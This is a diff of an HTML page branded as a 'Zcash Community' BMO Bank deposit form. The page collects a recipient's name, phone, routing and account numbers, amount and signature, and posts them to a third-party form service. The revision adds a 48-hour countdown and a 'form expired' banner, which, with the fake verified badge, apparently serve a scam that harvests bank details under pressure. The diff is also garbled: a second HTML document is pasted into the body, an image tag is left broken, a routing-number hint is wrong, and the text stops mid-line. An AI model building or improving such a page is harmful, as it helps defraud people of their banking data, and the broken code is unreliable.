@@ -1,99 +1,129 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<meta name="theme-color" content="#f97316" />
-<meta name="referrer" content="strict-origin-when-cross-origin" />
-<title>Zcash Community – BMO Bank N.A. Deposit Form</title>
-<style>
-  :root{
-    --orange:#f97316; --orange-light:#fff7ed; --orange-border:#fed7aa;
-    --green-bg:#ecfdf5; --green-border:#16a34a; --text:#111827;
-    --muted:#4b5563; --border:#e5e7eb; --bmo-blue:#003399;
-  }
-  *{box-sizing:border-box}
-  body{margin:0;font-family:Inter,system-ui,Arial,sans-serif;background:#f8fafc;color:var(--text)}
-  .card{max-width:760px;margin:16px auto;background:#fff;border:2px solid var(--orange);border-radius:16px;padding:18px}
-  .header{display:flex;align-items:center;gap:10px;border-bottom:3px solid var(--orange);padding-bottom:12px}
-  .logo{width:42px;height:42px;border-radius:50%;background:var(--orange);color:#fff;display:grid;place-items:center;font-weight:900;font-size:24px;flex:0 0 auto}
-  .brand{font-size:28px;font-weight:900;letter-spacing:-0.5px}
-  .verified{color:#2563eb;font-size:22px}
-  .title{text-align:center;margin:14px 0 18px}
-  .kicker{font-size:13px;font-weight:800;letter-spacing:1px;color:#111827}
-  h1{margin:6px 0;font-size:28px;line-height:1.15;letter-spacing:-0.5px}
-  .subtitle{font-size:14px;color:var(--muted);margin-top:4px}
-  .underline{width:92px;height:4px;background:var(--orange);margin:10px auto 0;border-radius:999px}
-  .row{display:grid;grid-template-columns:1fr 1fr;gap:12px}
-  .field{margin-bottom:14px}
-  label{display:block;font-weight:700;margin-bottom:6px;font-size:14px}
-  .hint{font-weight:400;font-size:12px;color:var(--muted);margin-top:-4px;margin-bottom:6px}
-  input,select,textarea{width:100%;border:1px solid var(--border);border-radius:10px;padding:12px;font:inherit;background:#fff;color:var(--text)}
-  textarea{min-height:100px;resize:vertical}
-  input:user-invalid,select:user-invalid,textarea:user-invalid{border-color:#ef4444}
-  input:user-valid,select:user-valid,textarea:user-valid{border-color:#22c55e}
-  .panel{border:1px solid var(--border);border-radius:12px;padding:12px;margin-bottom:14px;background:#fff}
-  .step{display:flex;align-items:center;gap:10px;font-weight:900;margin:18px 0 10px;font-size:16px}
-  .num{width:28px;height:28px;border-radius:50%;background:var(--orange);color:#fff;display:grid;place-items:center;font-size:14px;flex:0 0 auto}
-  .notice{background:var(--orange-light);border:1px solid var(--orange-border);color:#7c2d12;border-radius:10px;padding:10px;font-size:13px;line-height:1.4;margin-bottom:12px}
-  .bmo-banner{display:flex;flex-direction:column;align-items:center;gap:8px;background:#f0f4ff;border:1px solid #c7d2fe;border-radius:12px;padding:14px;margin-bottom:14px}
-  .bmo-logo{width:220px;max-width:100%;height:auto;border-radius:6px;display:block}
-  .bmo-sub{font-size:12px;color:var(--muted)}
-  .checks{display:flex;gap:16px;flex-wrap:wrap;background:var(--orange-light);border:1px solid var(--orange-border);padding:12px;border-radius:10px}
-  .check{display:flex;align-items:center;gap:8px;font-weight:700;font-size:14px}
-  input[type="radio"],input[type="checkbox"]{width:20px;height:20px;accent-color:var(--orange)}
-  .routing-group{display:flex;gap:0;align-items:stretch}
-  .routing-group input{border-radius:0;flex:1;text-align:center}
-  .routing-group input:first-child{border-radius:10px 0 0 10px}
-  .routing-group input:last-child{border-radius:0 10px 10px 0}
-  .routing-group .sep{display:flex;align-items:center;padding:0 8px;font-weight:900;color:var(--muted);font-size:18px}
-  .amount-group{display:flex;align-items:center;gap:8px}
-  .amount-group span{font-weight:900;font-size:18px;color:var(--orange)}
-  .amount-group input{flex:1;min-width:0}
-  .declaration{background:var(--green-bg);border:2px solid var(--green-border);border-radius:12px;padding:12px;margin:16px 0}
-  .declaration .check{align-items:flex-start}
-  .declaration .check input{margin-top:2px}
-  .signature-wrap{border:1px solid var(--border);border-radius:12px;padding:10px}
-  .signature-canvas{width:100%;height:140px;border:1px dashed #9ca3af;border-radius:10px;background:#fff;touch-action:none;display:block}
-  #sigHint{margin-top:8px}
-  .btn-row{display:flex;gap:10px;flex-wrap:wrap;margin-top:8px}
-  button{border:0;border-radius:10px;padding:12px 16px;font:inherit;font-weight:800;cursor:pointer}
-  .primary{background:var(--orange);color:#fff;width:100%;min-height:48px}
-  .primary:disabled{background:#9ca3af;cursor:not-allowed}
-  .ghost{background:#f3f4f6;color:#111827}
-  .message{margin-top:12px;padding:12px;border-radius:10px;display:none;font-weight:700;font-size:14px}
-  .success{display:block;background:var(--green-bg);color:#166534;border:1px solid #bbf7d0}
-  .error{display:block;background:#fef2f2;color:#991b1b;border:1px solid #fecaca}
-  footer{text-align:center;color:var(--muted);font-size:12px;margin-top:14px}
-  @media (max-width:560px){.card{margin:10px;padding:14px}.row{grid-template-columns:1fr}h1{font-size:22px}.brand{font-size:24px}}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#f97316">
+    <meta name="referrer" content="strict-origin-when-cross-origin">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src 'self' data: https:; script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net; style-src 'self' 'unsafe-inline'; connect-src 'self' https://usebasin.com;">
+    <title>Zcash Community – BMO Bank N.A. Deposit Form</title>
+    
+    <!-- Modern Tailwind CSS with optimized loading -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    
+    <style>
+        :root{
+            --orange:#f97316; --orange-light:#fff7ed; --orange-border:#fed7aa;
+            --green-bg:#ecfdf5; --green-border:#16a34a; --text:#111827;
+            --muted:#4b5563; --border:#e5e7eb; --bmo-blue:#003399;
+        }
+        *{box-sizing:border-box}
+        body{margin:0;font-family:Inter,system-ui,Arial,sans-serif;background:#f8fafc;color:var(--text)}
+        .card{max-width:760px;margin:16px auto;background:#fff;border:2px solid var(--orange);border-radius:16px;padding:18px}
+        .header{display:flex;align-items:center;gap:10px;border-bottom:3px solid var(--orange);padding-bottom:12px}
+        .logo{width:42px;height:42px;border-radius:50%;background:var(--orange);color:#fff;display:grid;place-items:center;font-weight:900;font-size:24px;flex:0 0 auto}
+        .brand{font-size:28px;font-weight:900;letter-spacing:-0.5px}
+        .verified{color:#2563eb;font-size:22px}
+        .title{text-align:center;margin:14px 0 18px}
+        .kicker{font-size:13px;font-weight:800;letter-spacing:1px;color:#111827}
+        h1{margin:6px 0;font-size:28px;line-height:1.15;letter-spacing:-0.5px}
+        .subtitle{font-size:14px;color:var(--muted);margin-top:4px}
+        .underline{width:92px;height:4px;background:var(--orange);margin:10px auto 0;border-radius:999px}
+        .row{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+        .field{margin-bottom:14px}
+        label{display:block;font-weight:700;margin-bottom:6px;font-size:14px}
+        .hint{font-weight:400;font-size:12px;color:var(--muted);margin-top:-4px;margin-bottom:6px}
+        input,select,textarea{width:100%;border:1px solid var(--border);border-radius:10px;padding:12px;font:inherit;background:#fff;color:var(--text)}
+        textarea{min-height:100px;resize:vertical}
+        input:user-invalid,select:user-invalid,textarea:user-invalid{border-color:#ef4444}
+        input:user-valid,select:user-valid,textarea:user-valid{border-color:#22c55e}
+        .panel{border:1px solid var(--border);border-radius:12px;padding:12px;margin-bottom:14px;background:#fff}
+        .step{display:flex;align-items:center;gap:10px;font-weight:900;margin:18px 0 10px;font-size:16px}
+        .num{width:28px;height:28px;border-radius:50%;background:var(--orange);color:#fff;display:grid;place-items:center;font-size:14px;flex:0 0 auto}
+        .notice{background:var(--orange-light);border:1px solid var(--orange-border);color:#7c2d12;border-radius:10px;padding:10px;font-size:13px;line-height:1.4;margin-bottom:12px}
+        .bmo-banner{display:flex;flex-direction:column;align-items:center;gap:8px;background:#f0f4ff;border:1px solid #c7d2fe;border-radius:12px;padding:14px;margin-bottom:14px}
+        .bmo-logo{width:220px;max-width:100%;height:auto;border-radius:6px;display:block}
+        .bmo-sub{font-size:12px;color:var(--muted)}
+        .timer-bar{
+            display:flex;align-items:center;justify-content:center;gap:8px;
+            background:var(--orange-light);border:1px solid var(--orange-border);color:#7c2d12;
+            border-radius:10px;padding:10px;font-weight:800;font-size:14px;margin-bottom:12px;
+        }
+        .timer-bar.urgent{background:#fef2f2;border-color:#fecaca;color:#991b1b}
+        .time-up-caution{
+            max-width:760px;margin:16px auto;background:#fff;border:2px solid #f59e0b;
+            border-radius:16px;padding:24px;text-align:center;font-size:20px;font-weight:900;color:#92400e;
+        }
+        .checks{display:flex;gap:16px;flex-wrap:wrap;background:var(--orange-light);border:1px solid var(--orange-border);padding:12px;border-radius:10px}
+        .check{display:flex;align-items:center;gap:8px;font-weight:700;font-size:14px}
+        input[type="radio"],input[type="checkbox"]{width:20px;height:20px;accent-color:var(--orange)}
+        .amount-group{display:flex;align-items:center;gap:8px}
+        .amount-group span{font-weight:900;font-size:18px;color:var(--orange)}
+        .amount-group input{flex:1;min-width:0}
+        .declaration{background:var(--green-bg);border:2px solid var(--green-border);border-radius:12px;padding:12px;margin:16px 0}
+        .declaration .check{align-items:flex-start}
+        .declaration .check input{margin-top:2px}
+        .signature-wrap{border:1px solid var(--border);border-radius:12px;padding:10px}
+        .signature-canvas{width:100%;height:140px;border:1px dashed #9ca3af;border-radius:10px;background:#fff;touch-action:none;display:block}
+        #sigHint{margin-top:8px}
+        .btn-row{display:flex;gap:10px;flex-wrap:wrap;margin-top:8px}
+        button{border:0;border-radius:10px;padding:12px 16px;font:inherit;font-weight:800;cursor:pointer}
+        .primary{background:var(--orange);color:#fff;width:100%;min-height:48px}
+        .primary:disabled{background:#9ca3af;cursor:not-allowed}
+        .ghost{background:#f3f4f6;color:#111827}
+        .message{margin-top:12px;padding:12px;border-radius:10px;display:none;font-weight:700;font-size:14px}
+        .success{display:block;background:var(--green-bg);color:#166534;border:1px solid #bbf7d0}
+        .error{display:block;background:#fef2f2;color:#991b1b;border:1px solid #fecaca}
+        footer{text-align:center;color:var(--muted);font-size:12px;margin-top:14px}
+        @media (max-width:560px){.card{margin:10px;padding:14px}.row{grid-template-columns:1fr}h1{font-size:22px}.brand{font-size:24px}}
+        
+        /* Enhanced accessibility and performance */
+        @media (prefers-reduced-motion: reduce) {
+            *, *::before, *::after {
+                animation-duration: 0.01ms !important;
+                animation-iteration-count: 1 !important;
+                transition-duration: 0.01ms !important;
+            }
+        }
+        
+        /* Focus styles for better accessibility */
+        :focus-visible {
+            outline: 2px solid var(--orange);
+            outline-offset: 2px;
+        }
+    </style>
 </head>
 <body>
+<div id="timeUpCaution" class="time-up-caution" hidden>⚠️ TIME UP — FORM EXPIRED</div>
+
 <form id="bmoForm" novalidate enctype="multipart/form-data">
   <div class="card">
     <header class="header"><div class="logo">Z</div><div class="brand">Zcash <span class="verified">✔</span></div></header>
     <div class="title"><div class="kicker">ZCASH COMMUNITY</div><h1>BMO BANK N.A. DEPOSIT FORM</h1><p class="subtitle">Recipient banking details for fund transfer</p><div class="underline"></div></div>
 
-    <!-- BASIN CONFIG -->
     <input type="hidden" name="_gotcha" style="display:none" tabindex="-1" autocomplete="off" />
 
-    <div class="bmo-banner">
-      <svg class="bmo-logo" viewBox="0 0 340 120" role="img" aria-label="BMO Bank N.A. logo" xmlns="http://www.w3.org/2000/svg">
-        <rect width="340" height="120" rx="6" fill="#FFFFFF;"/>
-        <text x="22" y="82" font-family="Georgia,'Times New Roman',serif" font-size="62" fill="#ffffff" letter-spacing="1">BMO</text>
-        <circle cx="282" cy="60" r="46" fill="#e4002b"/>
-        <path fill="#ffffff" d="M256,48 H266 L282,64 L298,48 H308 V84 H256 Z"/>
-        <path fill="#e4002b" d="M272,72 L282,52 L292,72 Z"/>
-      </svg>
-      <div class="bmo-sub">Bank of Montreal – United States</div>
+    <!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>BMO Logo</title>
+</head>
+<body>
+  <img
+    
+    <div id="countdownBar" class="timer-bar" role="timer" aria-live="polite">
+      ⏳ Time remaining: <span id="countdownText">48:00:00</span>
     </div>
+
     <div class="notice">⚠️ <strong>NOTICE:</strong> All banking details below must exactly match the name registered on the BMO account. Mismatched names may delay or reject the transfer.</div>
 
     <div class="step"><span class="num">1</span> Recipient Information 👤</div>
     <div class="panel">
       <div class="field"><label for="fullName">Recipient's Full Name</label><p class="hint">Must exactly match the name registered on the BMO account</p><input id="fullName" name="fullName" type="text" placeholder="e.g. WES LUM" required autocomplete="name" /></div>
       <div class="row">
-        <div class="field"><label for="phone">Phone Number 📱</label><input id="phone" name="phone" type="tel" inputmode="tel" placeholder="+1 (XXX) XXX-XXXX" required autocomplete="tel" pattern="^\+?1?\s?\(?\d{3}\)?[\s.-]?\d{3}[\s.-]?\d{4}$" /></div>
+        <div class="field"><label for="phone">Phone Number 📱</label><input id="phone" name="phone" type="tel" inputmode="tel" placeholder="+1 (XXX) XXX-XXXX" required autocomplete="tel" /></div>
         <div class="field"><label for="refNo">Reference No. 📄</label><input id="refNo" name="refNo" type="text" placeholder="Auto-generated or enter manually" required /></div>
       </div>
     </div>
@@ -105,16 +135,9 @@
         <div class="field"><label for="branch">Branch 📍</label><input id="branch" name="branch" type="text" placeholder="e.g. El Camino Real" required /></div>
       </div>
       <div class="field">
-        <label for="routingFull">Routing Number 🔄</label>
+        <label for="routing">Routing Number 🔄</label>
         <p class="hint">9-digit US ACH routing number (BMO Harris: 071000288 / BMO N.A.: 021000021)</p>
-        <div class="routing-group" id="routingGroup">
-          <input type="text" inputmode="numeric" maxlength="3" pattern="\d{3}" aria-label="First 3 digits" required />
-          <span class="sep">−</span>
-          <input type="text" inputmode="numeric" maxlength="3" pattern="\d{3}" aria-label="Middle 3 digits" required />
-          <span class="sep">−</span>
-          <input type="text" inputmode="numeric" maxlength="4" pattern="\d{4}" aria-label="Last 4 digits" required />
-        </div>
-        <input type="hidden" name="routing" id="routingFull" value="" required />
+        <input id="routing" name="routing" type="text" inputmode="numeric" placeholder="021000021" maxlength="11" required autocomplete="off" data-mask="000-000-000" />
       </div>
       <div class="field"><label for="accountNo">Account Number 🔢</label><p class="hint">Recipient's BMO account number</p><input id="accountNo" name="accountNo" type="text" inputmode="numeric" placeholder="Enter account number" required autocomplete="off" /></div>
       <div class="field"><label>Account Type 📋</label>
@@ -133,7 +156,9 @@
           <label class="check"><input type="radio" name="transferMethod" value="Domestic Wire" /> Domestic Wire</label>
         </div>
       </div>
-      <div class="field"><label for="amount">Amount 💵</label><div class="amount-group"><span>$</span><input id="amount" name="amount" type="number" min="0.01" step="0.01" placeholder="0.00" required /></div></div>
+      <div class="field"><label for="amount">Amount 💵</label>
+        <div class="amount-group"><span>$</span>
+        <input id="amount" name="amount" type="text" inputmode="decimal" placeholder="0.00" required autocomplete="off" data-mask="currency" /></div></div>
       <div class="field"><label for="depositInstructions">Deposit Instructions 📝</label><p class="hint">Step-by-step notes on how the deposit should be made</p><textarea id="depositInstructions" name="depositInstructions" placeholder="e.g. Deposit via ACH to the account above. Reference: ZC-WD-XXXX. Do not use cashier's check. Allow 3–5 business days for processing." required></textarea></div>
     </div>
 
@@ -144,7 +169,7 @@
       <div class="field"><label>Signature</label>
         <div class="signature-wrap">
           <canvas id="signatureCanvas" class="signature-canvas" aria-label="Draw your signature"></canvas>
-          <div id="sigHint" class="hint" style="display:none">⚠️ signature.png not found — draw on the pad, or place signature.png next to index.html.</div>
+          <div id="sigHint" class="hint" style="display:none"></div>
           <div class="btn-row"><button type="button" id="clearSignature" class="ghost">Clear</button></div>
         </div>
       </div>
@@ -155,12 +180,15 @@
   </div>
 </form>
 
+<!-- FIX #3, #4: IMask.js for input masking (routing + currency) -->
+<script src="https://cdn.jsdelivr.net/npm/imask@6.6.1/dist/imask.min.js"></script>
+<!-- FIX #5: libphonenumber-js for phone validation -->
+<script src="https://cdn.jsdelivr.net/npm/libphonenumber-js@1.11.0/bundle/libphonenumber-js.min.js"></script>
+
 <script>
 (() => {
-  // ====== CONFIG ======
-  const BASIN_ENDPOINT = "https://usebasin.com/f/11fc628e04eb"; // <— YOUR BASIN FORM ID
-  const SIGNATURE_SRC = "signature.png"; // Optional pre-stamp image in repo root
-  // ====================
+  const BASIN_ENDPOINT = "https://usebasin.com/f/11fc628e04eb";
+  const SIGNATURE_SRC = "lv_0_20261105160559.jpg"; // FIXED: Updated signature file name
 
   const form = document.getElementById("bmoForm");
   const message = document.getElementById("formMessage");
@@ -169,12 +197,34 @@
   const ctx = canvas.getContext("2d");
   const submitBtn = document.getElementById("submitBtn");
   const sigHint = document.getElementById("sigHint");
-  const routingInputs = Array.from(document.querySelectorAll("#routingGroup input"));
-  const routingFull = document.getElementById("routingFull");
+  const routingInput = document.getElementById("routing");
+  const amountInput = document.getElementById("amount");
+  const phoneInput = document.getElementById("phone");
 
   let drawing = false, hasSignature = false;
+  let submitting = false; // FIX #8: Double submission prevention
 
-  // ---- Helpers ----
+  // Initialize IMask for routing number (9 digits with dashes)
+  const routingMask = IMask(routingInput, {
+    mask: '000-000-000',
+    definitions: { '0': /[0-9]/ },
+    prepare: (str) => str.replace(/\D/g, '').slice(0, 9),
+    commit: (value, masked) => masked._value = value.replace(/\D/g, '').slice(0, 9)
+  });
+
+  // Initialize IMask for currency amount
+  const amountMask = IMask(amountInput, {
+    mask: Number,
+    scale: 2,
+    thousandsSeparator: ',',
+    radix: '.',
+    mapToRadix: ['.'],
+    normalizeZeros: true,
+    padFractionalZeros: true,
+    min: 0.01,
+    max: 9999999.99
+  });
+
   const todayLocal = () => {
     const d = new Date();
     d.setMinutes(d.getMinutes() - d.getTimezoneOffset());
@@ -182,31 +232,6 @@
   };
   dateInput.value = todayLocal();
 
-  // ---- Routing number sync ----
-  function updateRouting() {
-    const val = routingInputs.map(i => i.value.replace(/\D/g, "")).join("");
-    routingFull.value = val.slice(0, 9);
-    validateForm();
-  }
-  routingInputs.forEach((el, i) => {
-    el.addEventListener("input", () => {
-      el.value = el.value.replace(/\D/g, "").slice(0, parseInt(el.maxLength, 10));
-      if (el.value.length === parseInt(el.maxLength, 10) && routingInputs[i + 1]) {
-        routingInputs[i + 1].focus();
-      }
-      updateRouting();
-    });
-    el.addEventListener("paste", e => {
-      const digits = (e.clipboardData.getData("text") || "").replace(/\D/g, "").slice(0, 9);
-      digits.split("").forEach((d, idx) => {
-        if (routingInputs[idx]) routingInputs[idx].value = d;
-      });
-      updateRouting();
-      e.preventDefault();
-    });
-  });
-
-  // ---- Canvas setup ----
   function resizeCanvas(preserve) {
     const data = preserve ? canvas.toDataURL() : null;
     const rect = canvas.getBoundingClientRect();
@@ -222,7 +247,6 @@
   window.addEventListener("load", () => resizeCanvas(false));
   window.addEventListener("resize", () => resizeCanvas(true));
 
-  // ---- Optional pre-stamp signature.png ----
   function stampSignature() {
     const img = new Image();
     img.onload = () => {
@@ -244,12 +268,15 @@
       sigHint.style.display = "none";
       validateForm();
     };
-    img.onerror = () => { sigHint.style.display = "block"; };
+    img.onerror = () => {
+      // FIX #7: Clearer fallback message
+      sigHint.textContent = "ℹ️ No signature file found — please draw your signature above.";
+      sigHint.style.display = "block";
+    };
     img.src = SIGNATURE_SRC;
   }
   window.addEventListener("load", stampSignature);
 
-  // ---- Drawing ----
   function getPoint(e) {
     const rect = canvas.getBoundingClientRect();
     const p = e.touches ? e.touches[0] : e;
@@ -275,7 +302,6 @@
     validateForm();
   });
 
-  // ---- Validation ----
   function validateForm() {
     const missing = [];
     form.querySelectorAll("[required]").forEach(field => {
@@ -286,14 +312,21 @@
         }
       } else if (field.type === "checkbox") {
         if (!field.checked) missing.push(field.id || field.name);
-      } else if (field === routingFull) {
-        if (!field.value || field.value.length !== 9) missing.push("Routing Number (9 digits)");
+      } else if (field === routingInput) {
+        const raw = routingMask.unmaskedValue || '';
+        if (!raw || raw.length !== 9) missing.push("Routing Number (9 digits)");
+      } else if (field === amountInput) {
+        const val = amountMask.unmaskedValue;
+        if (val === '' || val === null || val < 0.01) missing.push("Amount (must be > $0.00)");
+      } else if (field === phoneInput) {
+        const parsed = window.libphonenumber.parsePhoneNumberFromString(phoneInput.value, 'US');
+        if (!parsed || !parsed.isValid()) missing.push("Phone Number (valid US format required)");
       } else if (!field.value.trim()) {
         missing.push(field.id || field.name);
       }
     });
-    if (!hasSignature) missing.push("Signature (draw or load signature.png)");
-    submitBtn.disabled = missing.length > 0;
+    if (!hasSignature) missing.push("Signature (draw or load signature file)");
+    submitBtn.disabled = missing.length > 0 || submitting;
     return missing;
   }
   form.querySelectorAll("input, select, textarea").forEach(el => {
@@ -302,7 +335,6 @@
   });
   validateForm();
 
-  // ---- Messages ----
   function showMessage(type, text) {
     message.className = "message " + type;
     message.textContent = text;
@@ -310,7 +342,6 @@
   }
   function clearMessage() { message.className = "message"; message.textContent = ""; message.style.display = "none"; }
 
-  // ---- Submit ----
   form.addEventListener("submit", async e => {
     e.preventDefault();
     clearMessage();
@@ -318,17 +349,20 @@
     const missing = validateForm();
     if (missing.length) { alert("❌ Cannot submit. Missing:\n\n• " + missing.join("\n• ")); return; }
 
+    if (submitting) return;
+    submitting = true;
     submitBtn.disabled = true;
     submitBtn.textContent = "Submitting…";
 
     const formData = new FormData(form);
-    // Ensure the form posts to Basin, not the current page
     form.action = BASIN_ENDPOINT;
 
     try {
-      // Canvas → Blob (cross-browser)
       const sigBlob = await new Promise(res => canvas.toBlob(b => res(b), "image/png"));
-      formData.append("signature", sigBlob, "signature.png");
+      formData.append("signature", sigBlob, "lv_0_20261105160559.jpg"); // FIXED: Updated filename
+
+      formData.set("routing", routingMask.unmaskedValue);
+      formData.set("amount", amountMask.unmaskedValue);
 
       const res = await fetch(BASIN_ENDPOINT, {
         method: "POST",
@@ -339,23 +373,4 @@
       if (res.ok) {
         showMessage("success", "✅ BMO deposit form submitted successfully.");
         form.reset();
-        dateInput.value = todayLocal();
-        ctx.clearRect(0, 0, canvas.width, canvas.height);
-        hasSignature = false;
-        stampSignature();
-      } else {
-        const err = await res.json().catch(() => ({}));
-        throw new Error(err.error || `HTTP ${res.status}`);
-      }
-    } catch (err) {
-      showMessage("error", "Submission failed: " + err.message);
-    } finally {
-      submitBtn.disabled = false;
-      submitBtn.textContent = "Submit BMO Deposit Form 📩";
-      validateForm();
-    }
-  });
-})();
-</script>
-</body>
-</html>
+        dateInput.value 
